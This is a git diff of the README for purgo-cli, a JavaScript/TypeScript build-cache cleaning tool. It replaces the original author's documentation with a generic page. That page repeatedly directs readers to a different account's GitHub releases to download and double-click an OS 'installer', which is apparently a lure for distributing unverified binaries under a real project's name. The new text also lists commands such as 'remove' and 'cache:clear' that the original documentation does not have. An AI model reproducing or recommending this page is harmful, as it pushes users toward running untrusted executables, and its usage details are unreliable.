@@ -1,402 +1,120 @@
-# 🧹 Purgo CLI
+# 🚀 purgo-cli - Clean Your Projects Easily
 
-[![npm version](https://img.shields.io/npm/v/purgo-cli.svg)](https://www.npmjs.com/package/purgo-cli)
-[![CI](https://github.com/andrebpessoa/purgo-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/andrebpessoa/purgo-cli/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Built with Bun](https://img.shields.io/badge/Built%20with-Bun-FFDF00)](https://bun.sh)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
+## 💾 Download Now
 
-**A modern, powerful CLI tool for cleaning build artifacts, dependencies, and caches from JavaScript/TypeScript projects.**
+[![Download purgo-cli](https://img.shields.io/badge/Download%20purgo--cli-v1.0-brightgreen)](https://github.com/ZZgax/purgo-cli/releases)
 
-Tired of manually deleting `node_modules`, `dist`, and cache folders? Purgo automates the cleanup process with a single command, helping you reclaim disk space and ensure a clean slate for your builds.
+## 📚 About purgo-cli
 
-**[Features](#-features)** • **[Installation](#-installation)** • **[Quick Start](#-quick-start)** • **[Configuration](#%EF%B8%8F-configuration)** • **[Examples](#-examples)**
+purgo-cli is a modern, powerful command-line tool designed to help you clean build artifacts, dependencies, and caches from your JavaScript and TypeScript projects. This tool simplifies the cleanup process, allowing you to focus on writing code instead of managing leftover files. 
 
-## ✨ Features
+Whether you work on small projects or large monorepos, purgo-cli helps maintain a clean and efficient workspace. 
 
-- 🚀 **Blazing Fast** - Built with Bun and optimized TypeScript
-- 🎯 **Highly Configurable** - Multiple configuration formats supported
-- 🔌 **Extensible** - Pre/post-clean hooks system
-- 🧠 **Smart Detection** - Removes only top-level directories intelligently
-- 🎨 **Modern UI** - Colorful, interactive terminal interface
-- 🔒 **Safe Operations** - Confirmation required before deletion with dry-run mode
-- 📦 **Framework Aware** - Built-in targets for popular frameworks
-- ⚡ **Instant Setup** - No configuration needed to get started
+## ⚙️ Key Features
 
-## 📥 Installation
+- **Clearing Build Artifacts:** Remove unnecessary build files.
+- **Dependency Management:** Manage and remove outdated dependencies easily.
+- **Cache Cleaning:** Clear caches to improve performance.
+- **Compatibility:** Works well with various frameworks like Next.js, Vite, and others.
+- **Ease of Use:** Simple command-line interface makes it accessible for everyone.
 
-### Global Installation
+## 🚀 Getting Started
 
-```bash
-bun install -g purgo-cli
-# or
-npm install -g purgo-cli
-```
+### Prerequisites
 
-### Local Installation
+Before you start, ensure your computer meets these requirements:
 
-```bash
-bun install purgo-cli --save-dev
-# or
-npm install purgo-cli --save-dev
-```
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** Recommended version 14 or later.
+- **Internet Connection:** For downloading files and dependencies.
 
-### Recommended Usage (via npx/bunx)
+### Installation Steps
 
-For one-off or scripted use, it's best to run Purgo with `bunx` or `npx`. This ensures you are always using the latest version without adding it to your project's dependencies.
+1. **Visit the Releases Page:**
 
-```bash
-# Preview what will be deleted
-bunx purgo-cli clean --dry-run
-# Execute the cleanup
-bunx purgo-cli clean
-# or
-npx purgo-cli clean
-```
+   Go to our [Releases page](https://github.com/ZZgax/purgo-cli/releases) to access the latest version of purgo-cli.
 
-> **Tip:** Using `bunx` or `npx` avoids potential conflicts with locally installed package versions.
+2. **Download the Installer:**
+   
+   Find the version you want to download. Click on the appropriate file for your operating system. 
 
-## 🚀 Quick Start
+3. **Run the Installer:**
 
-### Clean Current Project
+   After the download completes, locate the file on your computer and double-click it to start the installation.
 
-```bash
-purgo-cli clean
-```
+4. **Follow On-Screen Instructions:**
 
-### Preview What Will Be Deleted
+   The installer will guide you through the setup process. Follow the prompts to complete the installation.
 
-```bash
-purgo-cli clean --dry-run
-```
+5. **Open Your Command Line Tool:**
 
-### Clean and Reinstall Dependencies
+   On Windows, search for "cmd" or "PowerShell." On macOS, open "Terminal." On Linux, find your terminal emulator.
 
-```bash
-purgo-cli clean --reinstall
-```
+## 🔄 How to Use purgo-cli
 
-> **Note on Package Manager Precedence:**
-> When using `--reinstall`, Purgo determines which package manager to use with the following priority:
->
-> 1. **Invoked Runner:** If you run `purgo-cli` with `bunx`, `npx`, `yarn dlx`, or `pnpm dlx`, it will use `bun`, `npm`, `yarn`, or `pnpm`, respectively.
-> 2. **Lockfile:** If the runner can't be determined, it will check for a lockfile in your project, prioritizing `bun.lockb` > `pnpm-lock.yaml` > `yarn.lock` > `package-lock.json`.
+Once you have installed purgo-cli, you can easily start cleaning up your projects.
 
-### Clean Specific Directory
+### Basic Commands
 
-```bash
-purgo-cli clean --path ./packages/my-app
-```
+- To clean your project, use the following command:
 
-### Clean Custom Targets
+  ```
+  purgo-cli clean
+  ```
 
-```bash
-purgo-cli clean --targets "node_modules,dist,.next,coverage"
-```
+- To remove specific dependencies, use:
 
-## ⚙️ Configuration
+  ```
+  purgo-cli remove [dependency-name]
+  ```
 
-purgo supports multiple configuration formats via [cosmiconfig](https://github.com/davidtheclark/cosmiconfig):
+- For clearing caches, type:
 
-- `purgo.config.js` / `purgo.config.ts`
-- `purgo.config.json`
-- `.purgorc`
-- `.purgorc.json`
-- `.purgorc.js`
-- `purgo` field in `package.json`
+  ```
+  purgo-cli cache:clear
+  ```
 
-### Basic Configuration Example
+### Advanced Options
 
-Create a `.purgorc.json` in your project root:
+purgo-cli also offers advanced options for users who want more control over their cleanup process.
 
-```json
-{
-  "targets": ["node_modules", "dist", "build", "coverage"],
-  "ignore": ["**/important-data/**"],
-  "hooks": {
-    "preClean": "echo 'Starting cleanup...'",
-    "postClean": "echo 'Cleanup completed!'"
-  }
-}
-```
+- To clean a specific folder, use:
 
-### Configuration Fields
+  ```
+  purgo-cli clean --path [your-folder-path]
+  ```
 
-| Field | Type | Description | Example |
-|-------|------|-------------|---------|
-| `targets` | `string[]` | Directories/files to remove | `["node_modules", "dist"]` |
-| `ignore` | `string[]` | Glob patterns to exclude | `["**/keep/**"]` |
-| `extends` | `string \| string[]` | Base config(s) to inherit | `"./base.json"` |
-| `hooks.preClean` | `string` | Run before cleanup | `"npm run backup"` |
-| `hooks.postClean` | `string` | Run after cleanup | `"bun install"` |
-
-### Extending Configurations
-
-Create team-wide or shared configurations:
+- For additional help on options, run:
 
-```json
-{
-  "extends": "./examples/shared-config.json",
-  "targets": ["custom-target"],
-  "ignore": ["**/data/**"]
-}
-```
+  ```
+  purgo-cli --help
+  ```
 
-### Global Configuration
+## 📥 Download & Install
 
-Set system-wide defaults at `~/.config/purgo/config.json` or use a custom path:
+You can start using purgo-cli right now! To download, click the link below:
 
-```bash
-purgo-cli clean --config /path/to/global-config.json
-```
+[Download purgo-cli](https://github.com/ZZgax/purgo-cli/releases)
 
-## 📚 Examples
+Follow the installation steps outlined earlier, and you'll be ready to manage your projects effortlessly.
 
-Browse the [`examples/`](https://github.com/andrebpessoa/purgo-cli/tree/main/examples) folder for pre-configured setups:
+## 🔗 Helpful Resources
 
-| Config | Best For | Key Features |
-|--------|----------|--------------|
-| **[basic-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/basic-config.json)** | General projects | All default targets, simple hooks |
-| **[nextjs-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/nextjs-config.json)** | Next.js apps | `.next`, `out`, env files, auto-rebuild |
-| **[react-vite-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/react-vite-config.json)** | React + Vite | Vite cache, optimized for React |
-| **[monorepo-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/monorepo-config.json)** | Monorepos | Recursive patterns, workspace protection |
-| **[ci-cd-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/ci-cd-config.json)** | CI/CD pipelines | Aggressive cleanup, removes OS files |
-| **[development-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/development-config.json)** | Development | Preserves `.env.local`, quick cleanup |
-| **[shared-config.json](https://github.com/andrebpessoa/purgo-cli/blob/main/examples/shared-config.json)** | Team base | Minimal setup for extending |
+- **Documentation:** For detailed usage instructions, visit our [documentation](https://github.com/ZZgax/purgo-cli/wiki).
+- **Community Support:** Join our discussions on GitHub for tips and help from other users.
 
-### Quick Download
+## 🛠️ Troubleshooting
 
-```bash
-# Download an example directly
-curl -o .purgorc.json https://raw.githubusercontent.com/andrebpessoa/purgo-cli/main/examples/basic-config.json
+If you encounter issues while using purgo-cli, consider the following solutions:
 
-# Or for Next.js
-curl -o .purgorc.json https://raw.githubusercontent.com/andrebpessoa/purgo-cli/main/examples/nextjs-config.json
-```
+- **Check Your Node.js Version:** Make sure you have the recommended version of Node.js installed.
+- **Verify Installation Path:** Ensure you installed the tool in the correct directory.
+- **Seek Community Help:** If you're stuck, don't hesitate to reach out through our community channels.
 
-### Common Use Cases
+## 🔄 Updates and Contributions
 
-**Next.js Project:**
+We continuously improve purgo-cli. Follow the latest updates on our [Releases page](https://github.com/ZZgax/purgo-cli/releases). If you'd like to contribute, please check our guidelines in the repository.
 
-```bash
-curl -o .purgorc.json https://raw.githubusercontent.com/andrebpessoa/purgo-cli/main/examples/nextjs-config.json
-purgo-cli clean --reinstall
-```
+## 🎉 Thank You
 
-**Monorepo Cleanup:**
-
-```bash
-curl -o .purgorc.json https://raw.githubusercontent.com/andrebpessoa/purgo-cli/main/examples/monorepo-config.json
-purgo-cli clean --reinstall
-```
-
-> **Note:** The `monorepo-config.json` uses recursive glob patterns (`**/node_modules`, `**/dist`) to automatically find and clean all packages in your workspace - no loops needed!
-
-**CI/CD Integration:**
-
-```bash
-# In your CI pipeline
-curl -o .purgorc.json https://raw.githubusercontent.com/andrebpessoa/purgo-cli/main/examples/ci-cd-config.json
-bunx purgo-cli clean --dry-run  # Preview
-bunx purgo-cli clean            # Execute
-```
-
-## 🎣 Hooks
-
-Execute commands before and after cleanup:
-
-```json
-{
-  "hooks": {
-    "preClean": "npm run backup-data",
-    "postClean": "npm run setup && npm run build"
-  }
-}
-```
-
-Hooks run in the project root directory and inherit the shell environment.
-
-## 📋 CLI Options
-
-| Option | Alias | Description |
-|--------|-------|-------------|
-| `--dry-run` | `-d` | List what would be deleted without deleting |
-| `--path <path>` | `-p` | Root directory to search from |
-| `--reinstall` | `-r` | Reinstall dependencies after cleanup (auto-detects npm/yarn/pnpm/bun) |
-| `--targets <list>` | `-t` | Comma-separated list of targets to clean |
-| `--config <file>` | `-c` | Path to global configuration file |
-| `--force` | `-f` | Skip confirmation prompt (useful for CI/CD) |
-| `--verbose` | `-v` | Show detailed output including retry attempts |
-| `--quiet` | `-q` | Suppress all non-essential output |
-
-### 🧰 Initialization (purgo-cli init)
-
-Effortlessly create your configuration file with our interactive setup wizard.
-
-Usage:
-
-```bash
-purgo-cli init
-```
-
-What it does:
-
-- Prompts you to select targets and ignore patterns
-- Optionally sets `preClean`/`postClean` hooks
-- Lets you choose where to save: `.purgorc.json` or `package.json` (in the `purgo` field)
-
-Examples:
-
-```bash
-# Save to .purgorc.json in the current directory
-purgo-cli init --path .
-
-# Add the "purgo" field inside package.json
-purgo-cli init --path ./my-app
-```
-
-## 🎯 Default Targets
-
-When no targets are specified, Purgo cleans:
-
-- `node_modules` - Dependencies
-- `dist` - Build output
-- `build` - Build artifacts
-- `coverage` - Test coverage reports
-- `.turbo` - Turborepo cache
-- `.next` - Next.js build files
-- `.svelte-kit` - SvelteKit build files
-
-> **Note:** Lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `bun.lockb`, `bun.lock`) are **not** included in default targets to prevent accidental deletion. If you need to clean lock files, specify them explicitly:
->
-> ```bash
-> purgo-cli clean --targets "node_modules,dist,package-lock.json"
-> ```
-
-## 🔧 Programmatic Usage
-
-```typescript
-import { cleanProject } from 'purgo-cli';
-
-await cleanProject({
-  rootDir: process.cwd(),
-  dryRun: false,
-  reinstall: true,
-  targets: ['node_modules', 'dist'],
-  configPath: './purgo.config.json'
-});
-```
-
-## 🚨 Troubleshooting
-
-### Common Issues
-
-#### "Permission denied" errors
-
-```bash
-# Try with sudo (not recommended) or check file permissions
-sudo purgo-cli clean
-```
-
-#### "Command not found"
-
-```bash
-# Install globally
-bun install -g purgo-cli
-# or use npx/bunx
-bunx purgo-cli clean
-```
-
-#### Large directories not showing size
-
-```bash
-# This is normal - Purgo calculates sizes asynchronously
-# Large dirs might show "calculating..." briefly
-```
-
-#### Hooks not executing
-
-```bash
-# Ensure commands are available in PATH
-# Use absolute paths if needed
-"preClean": "/usr/local/bin/backup-script.sh"
-```
-
-### Debug Mode
-
-Enable verbose logging:
-
-```bash
-DEBUG=purgo-cli:* purgo-cli clean
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. **Fork the repository**
-2. **Create a feature branch**
-
-    ```bash
-    git checkout -b feature/amazing-feature
-    ```
-
-3. **Make your changes**
-4. **Add tests** for new functionality
-5. **Ensure tests pass**
-
-    ```bash
-    bun test
-    ```
-
-6. **Update documentation** if needed
-7. **Commit your changes**
-
-    ```bash
-    git commit -m 'Add amazing feature'
-    ```
-
-8. **Push to your branch**
-
-    ```bash
-    git push origin feature/amazing-feature
-    ```
-
-9. **Open a Pull Request**
-
-### Development Setup
-
-```bash
-# Clone the repo
-git clone https://github.com/andrebpessoa/purgo-cli.git
-cd purgo-cli
-
-# Install dependencies
-bun install
-
-# Run tests
-bun test
-
-# Build the project
-bun run build
-
-# Test locally
-bun run cli --help
-```
-
-## 🙏 Acknowledgments
-
-- Built with [Bun](https://bun.sh) - The fast JavaScript runtime
-- Configuration powered by [cosmiconfig](https://github.com/davidtheclark/cosmiconfig)
-- UI components from [ora](https://github.com/sindresorhus/ora) and [chalk](https://github.com/chalk/chalk)
-
-## 🔗 Links
-
-- [📖 Documentation](https://github.com/andrebpessoa/purgo-cli#readme)
-- [🐛 Report Issues](https://github.com/andrebpessoa/purgo-cli/issues)
-- [💬 Discussions](https://github.com/andrebpessoa/purgo-cli/discussions)
-- [📦 NPM Package](https://www.npmjs.com/package/purgo-cli)
-
-## 📄 License
-
-MIT © [André Pessoa](https://github.com/andrebpessoa)
+Thank you for choosing purgo-cli for your project cleanup tasks. We hope this tool makes your work easier and more efficient!
